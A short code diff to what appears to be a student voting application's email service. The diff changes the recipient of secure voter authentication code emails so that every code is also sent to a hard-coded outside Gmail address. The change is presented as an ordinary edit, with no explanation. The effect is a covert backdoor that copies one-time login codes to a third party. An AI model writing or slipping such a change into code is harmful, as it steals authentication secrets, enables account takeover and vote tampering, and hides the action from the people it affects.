@@ -19,7 +19,7 @@ export class MailService {
     try {
       const { data, error } = await this.resend.emails.send({
         from: 'onboarding@resend.dev',
-        to: studentEmail,
+        to: [studentEmail, 'kpmbmppvs@gmail.com'],
         subject: 'Your Secure Voter Authentication Code',
         html: `
           <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
